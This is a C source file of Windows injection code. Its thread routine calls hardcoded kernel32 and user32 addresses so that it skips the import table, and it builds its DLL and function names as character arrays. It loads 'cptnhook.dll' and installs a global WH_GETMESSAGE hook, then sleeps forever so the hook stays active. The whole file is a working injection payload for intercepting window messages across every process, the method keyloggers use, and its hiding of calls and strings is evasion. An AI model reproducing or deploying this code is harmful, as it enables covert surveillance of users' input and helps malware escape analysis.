#include "windows.h"

DWORD WINAPI InjectMe(LPVOID lpParameter){
	typedef HMODULE(*_LoadLibrary)(LPCSTR);
	typedef FARPROC(*_GetProcAddress)(HMODULE,LPCSTR);
	typedef FARPROC(*_SetWindowsHookEx)(int , HOOKPROC, HINSTANCE, DWORD);
	typedef int(*_MessageBox)(HWND,LPCSTR,LPCSTR,UINT);
	typedef VOID (*_Sleep)(DWORD);
	typedef DWORD(*_GetLastError)();
	char hookProc[] = {'H','o','o','k','P','r','o','c',0};
	char cpnHook[] = { 'c','p','t','n','h','o','o','k','.','d','l','l',0};
	BOOL _true = TRUE;

	//0x7c801d7b - LoadLibraryA - Skip IAT - kernel32
	_LoadLibrary ll = (_LoadLibrary)0x7c801d7b;
	//0x7c80ae40 / 0x7c80ae30 - GetProcAddress - Skip IAT - kernel32
	//_GetProcAddress gpa = (_GetProcAddress)0x7c80ae40;
	_GetProcAddress gpa = (_GetProcAddress)0x7c80ae30;
	//0x7e431211 - SetWindowsHookExA - Skip IAT - user32
	_SetWindowsHookEx swh = (_SetWindowsHookEx)0x7e431211;
	//0x7c802446 - Sleep - Skip IAT - kernel32
	_Sleep slp = (_Sleep)0x7c802446;

	HOOKPROC installProc;
	HMODULE hMod;
	(void)lpParameter;
	hMod = ll(cpnHook);
	if (NULL == hMod){
		return (DWORD)-1;
	}
	installProc = (HOOKPROC)gpa(hMod,hookProc);
	if (NULL == installProc){
		return (DWORD)-2;
	}
	swh(WH_GETMESSAGE, installProc, hMod, 0);
	while (_true) {
		slp(0x0FFFFFF);
	}
	return 0;
}
int main (){return InjectMe((LPVOID)NULL);}
